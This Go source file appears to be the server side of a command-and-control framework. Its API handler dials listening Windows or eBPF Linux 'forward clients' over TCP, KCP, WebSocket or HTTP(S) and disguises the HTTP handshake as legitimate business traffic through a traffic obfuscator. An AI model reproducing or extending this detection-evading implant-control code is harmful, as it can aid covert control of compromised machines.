package api

import (
	k "BackendTemplate/pkg/connection/kcp"
	"BackendTemplate/pkg/connection/tcp"
	"BackendTemplate/pkg/connection/websocket"
	"BackendTemplate/pkg/security"
	"bufio"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"

	"BackendTemplate/pkg/utils/logx"
	"github.com/gin-gonic/gin"
	gorillaws "github.com/gorilla/websocket"
	"github.com/xtaci/kcp-go/v5"
)

// ForwardConnectRequest 正向连接请求体
type ForwardConnectRequest struct {
	IsEbpfClient     bool   `json:"isEbpfClient"`     // true: Linux 正向客户端（标签语义，连接通道同 TCP/KCP/WebSocket）
	ConnectionMethod string `json:"connectionMethod"` // 连接方式: TCP, KCP/UDP, WebSocket
	IPAddress        string `json:"ipAddress"`        // 正向客户端监听的IP地址（支持域名）
	Port             string `json:"port"`             // 正向客户端监听的端口
	Password         string `json:"password"`         // 兼容字段：正向协议无密码握手，忽略
	Vkey             string `json:"vkey"`             // 兼容字段：密钥由监听器配置提供，忽略
	EncryptionSalt   string `json:"encryptionSalt"`   // 兼容字段：密钥由监听器配置提供，忽略
}

// ConnectForwardClient 服务端连接正向客户端
func ConnectForwardClient(c *gin.Context) {
	var req ForwardConnectRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"status":  400,
			"message": "请求参数无效",
			"error":   err.Error(),
		})
		return
	}

	// 验证必需参数
	if req.IPAddress == "" || strings.ContainsAny(req.IPAddress, " \t") {
		c.JSON(http.StatusBadRequest, gin.H{
			"status":  400,
			"message": "IP地址不能为空",
		})
		return
	}

	if req.Port == "" {
		c.JSON(http.StatusBadRequest, gin.H{
			"status":  400,
			"message": "端口不能为空",
		})
		return
	}

	// 验证端口号
	port, err := strconv.Atoi(req.Port)
	if err != nil || port < 1 || port > 65535 {
		c.JSON(http.StatusBadRequest, gin.H{
			"status":  400,
			"message": "端口号无效，必须是1-65535之间的数字",
		})
		return
	}

	// 验证连接方式
	validMethods := map[string]bool{
		"TCP":       true,
		"KCP/UDP":   true,
		"WebSocket": true,
		"HTTP":      true,
		"HTTPS":     true,
	}

	if !validMethods[req.ConnectionMethod] {
		c.JSON(http.StatusBadRequest, gin.H{
			"status":  400,
			"message": "不支持的连接方式",
		})
		return
	}

	logx.Infof("🔗 [FORWARD-CONNECT] 开始连接正向客户端: %s:%s (%s, ebpf=%t)\n", req.IPAddress, req.Port, req.ConnectionMethod, req.IsEbpfClient)

	// 构建连接地址
	targetAddress := fmt.Sprintf("%s:%s", req.IPAddress, req.Port)

	// 手动连接支持显式会话密钥（与服务端/客户端 patched 密钥一致）；空则用监听器配置
	masterKey, salt := padForwardKeys(req.Vkey, req.EncryptionSalt)

	// 根据连接方式进行连接
	var err_connect error

	switch req.ConnectionMethod {
	case "TCP":
		err_connect = connectTCPForward(targetAddress, masterKey, salt)
	case "WebSocket":
		err_connect = connectWebSocketForward(targetAddress, masterKey, salt)
	case "KCP/UDP":
		err_connect = connectKCPForward(targetAddress, masterKey, salt)
	case "HTTP":
		err_connect = connectHTTPForward(targetAddress, masterKey, salt)
	case "HTTPS":
		err_connect = connectHTTPSForward(targetAddress, masterKey, salt)
	default:
		c.JSON(http.StatusBadRequest, gin.H{
			"status":  400,
			"message": "不支持的连接方式",
		})
		return
	}

	if err_connect != nil {
		logx.Errorf("❌ [FORWARD-CONNECT] 连接失败: %v\n", err_connect)
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": fmt.Sprintf("连接正向客户端失败: %v", err_connect),
		})
		return
	}

	logx.Infof("✅ [FORWARD-CONNECT] 成功连接到正向客户端: %s\n", targetAddress)

	c.JSON(http.StatusOK, gin.H{
		"status":  200,
		"message": "正向连接建立成功",
		"data": gin.H{
			"target_address":    targetAddress,
			"connection_method": req.ConnectionMethod,
			"client_type":       getClientType(req.IsEbpfClient),
		},
	})
}

// padForwardKeys 补齐主密钥(32)/盐(16)，返回 (nil, nil) 表示使用监听器默认配置
func padForwardKeys(vkey, encryptSalt string) ([]byte, []byte) {
	if vkey == "" || encryptSalt == "" {
		return nil, nil
	}
	masterKey := make([]byte, 32)
	copy(masterKey, []byte(vkey))
	salt := make([]byte, 16)
	copy(salt, []byte(encryptSalt))
	return masterKey, salt
}

// connectTCPForward 连接TCP正向客户端（复用反向 TCP 协议处理，协议帧完全一致）
func connectTCPForward(address string, masterKey, salt []byte) error {
	logx.Infof("🔗 [TCP-FORWARD] 尝试连接TCP正向客户端: %s\n", address)

	conn, err := net.DialTimeout("tcp", address, 10*time.Second)
	if err != nil {
		return fmt.Errorf("TCP连接失败: %v", err)
	}

	if len(masterKey) > 0 && len(salt) > 0 {
		go tcp.HandleForwardConnectionWithKeys(conn, masterKey, salt)
	} else {
		go tcp.HandleForwardConnection(conn)
	}
	return nil
}

// connectWebSocketForward 连接WebSocket正向客户端（客户端本地提供 /ws 服务）
func connectWebSocketForward(address string, masterKey, salt []byte) error {
	logx.Infof("🔗 [WS-FORWARD] 尝试连接WebSocket正向客户端: %s\n", address)

	ws, _, err := gorillaws.DefaultDialer.Dial("ws://"+address+"/ws", nil)
	if err != nil {
		return fmt.Errorf("WebSocket连接失败: %v", err)
	}

	if len(masterKey) > 0 && len(salt) > 0 {
		go websocket.HandleWebSocketForWithKeys(ws, masterKey, salt)
	} else {
		go websocket.HandleWebSocketFor(ws)
	}
	return nil
}

// connectKCPForward 连接KCP正向客户端
func connectKCPForward(address string, masterKey, salt []byte) error {
	logx.Infof("🔗 [KCP-FORWARD] 尝试连接KCP正向客户端: %s\n", address)

	sess, err := kcp.DialWithOptions(address, nil, 10, 3)
	if err != nil {
		return fmt.Errorf("KCP连接失败: %v", err)
	}
	sess.SetWindowSize(1024, 1024)
	sess.SetNoDelay(1, 20, 2, 1)
	sess.SetMtu(1400)
	sess.SetStreamMode(true)

	if len(masterKey) > 0 && len(salt) > 0 {
		go k.HandleKCPForwardConnectionWithKeys(sess, masterKey, salt)
	} else {
		go k.HandleKCPForwardConnection(sess)
	}
	return nil
}

// connectHTTPForward 连接HTTP正向客户端（客户端 Hijack 转原始协议流，复用 tcp_forward 分帧协议）
func connectHTTPForward(address string, masterKey, salt []byte) error {
	return connectHTTPForwardTLS(address, "http_forward", false, masterKey, salt)
}

// connectHTTPSForward 连接HTTPS正向客户端（自签证书，跳过校验）
func connectHTTPSForward(address string, masterKey, salt []byte) error {
	return connectHTTPForwardTLS(address, "https_forward", true, masterKey, salt)
}

// bufferedConn 先读缓冲再读底层连接的 net.Conn 包装：
// HTTP 握手响应与 firstBlood 可能同段到达，ReadResponse 会把 firstBlood 吞进 bufio，需保留缓冲
type bufferedConn struct {
	net.Conn
	reader *bufio.Reader
}

func (c *bufferedConn) Read(p []byte) (int, error) { return c.reader.Read(p) }

func connectHTTPForwardTLS(address, listenerType string, useTLS bool, masterKey, salt []byte) error {
	scheme := "http"
	var conn net.Conn
	var err error
	start := time.Now()
	if useTLS {
		// J8: 启用 TLS 证书校验（原 InsecureSkipVerify: true → 中间人风险）
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: 10 * time.Second}, "tcp", address,
			&tls.Config{InsecureSkipVerify: false})
		scheme = "https"
	} else {
		conn, err = net.DialTimeout("tcp", address, 10*time.Second)
	}
	if err != nil {
		reportForwardMetrics(false, start)
		return fmt.Errorf("%s连接失败: %v", scheme, err)
	}

	// P3-2: 握手请求经流量混淆器生成（伪装为合法业务流量）。
	// 客户端 HTTP-forward 对任何合法 HTTP 请求都会 Hijack 转原始流，混淆不破坏协议。
	var handshake []byte
	if security.GlobalTrafficObfuscator != nil {
		if obfReq, oerr := security.GlobalTrafficObfuscator.ObfuscateRequest(nil, ""); oerr == nil {
			var buf strings.Builder
			buf.WriteString(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n", obfReq.URL.RequestURI(), address))
			obfReq.Header.Write(&buf)
			buf.WriteString("\r\n")
			handshake = []byte(buf.String())
		}
	}
	if len(handshake) == 0 {
		// 混淆器不可用时的回退握手
		handshake = []byte(fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n", address))
	}
	if _, err := conn.Write(handshake); err != nil {
		conn.Close()
		reportForwardMetrics(false, start)
		return fmt.Errorf("发送HTTP请求失败: %v", err)
	}

	// 读取 HTTP 200 响应头，随后连接转为原始协议流（保留 bufio 缓冲，防 firstBlood 被吞）
	reader := bufio.NewReader(conn)
	if _, err := http.ReadResponse(reader, &http.Request{Method: "GET"}); err != nil {
		conn.Close()
		reportForwardMetrics(false, start)
		return fmt.Errorf("HTTP握手失败: %v", err)
	}
	reportForwardMetrics(true, start)
	wrapped := &bufferedConn{Conn: conn, reader: reader}

	if len(masterKey) > 0 && len(salt) > 0 {
		go tcp.HandleTcpConnectionForWithKeys(wrapped, listenerType, masterKey, salt)
	} else {
		go tcp.HandleTcpConnectionFor(wrapped, listenerType)
	}
	return nil
}

// reportForwardMetrics 将正向连接结果喂回混淆器网络质量监控（驱动协议切换规则，
// 原切换调度器无真实数据来源，失败/延迟规则永不触发）
func reportForwardMetrics(success bool, start time.Time) {
	if security.GlobalTrafficObfuscator == nil {
		return
	}
	latency := time.Since(start)
	security.GlobalTrafficObfuscator.UpdateNetworkMetrics(
		security.GlobalTrafficObfuscator.GetCurrentProfile(), success, latency, latency)
}

// getClientType 获取客户端类型描述
func getClientType(isEbpfClient bool) string {
	if isEbpfClient {
		return "Linux正向客户端"
	}
	return "Windows正向客户端"
}
